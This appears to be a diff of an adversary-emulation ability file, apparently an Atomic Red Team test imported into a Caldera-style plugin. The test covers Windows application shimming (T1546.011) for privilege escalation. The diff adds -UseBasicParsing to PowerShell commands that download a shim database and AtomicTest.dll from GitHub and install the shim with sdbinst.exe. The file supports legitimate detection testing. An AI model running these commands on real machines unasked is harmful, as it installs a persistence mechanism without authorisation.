@@ -19,11 +19,11 @@
           = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb"
-          -OutFile "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"; fi; if (Test-Path
-          c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}; then : ; else New-Item
-          -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore
-          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"
-          -OutFile c:\Tools\AtomicTest.dll; fi; sdbinst.exe "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"'
+          -OutFile "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb" -UseBasicParsing;
+          fi; if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}; then
+          : ; else New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction
+          ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"
+          -OutFile c:\Tools\AtomicTest.dll -UseBasicParsing; fi; sdbinst.exe "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"'
         cleanup: sdbinst.exe -u "#{file_path}" >nul 2>&1
         elevation_required: true
   plugin: atomic
@@ -32,9 +32,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - privilege-escalation
   - atomic-red-team
   - t1546.011
-  - privilege-escalation
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -55,7 +55,7 @@
         Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb"
-        -OutFile "#{file_path}"
+        -OutFile "#{file_path}" -UseBasicParsing
 
         '
     - description: 'AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
@@ -69,9 +69,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"
-        -OutFile c:\Tools\AtomicTest.dll
+        -OutFile c:\Tools\AtomicTest.dll -UseBasicParsing
 
         '
     technique_created: '2020-01-24T14:56:24.231Z'
     atomic_guid: 9ab27e22-ee62-4211-962b-d36d9a0e6a18
-    import_timestamp: '2026-10-20T07:08:27.195790Z'
+    import_timestamp: '2026-10-21T07:01:49.882304Z'
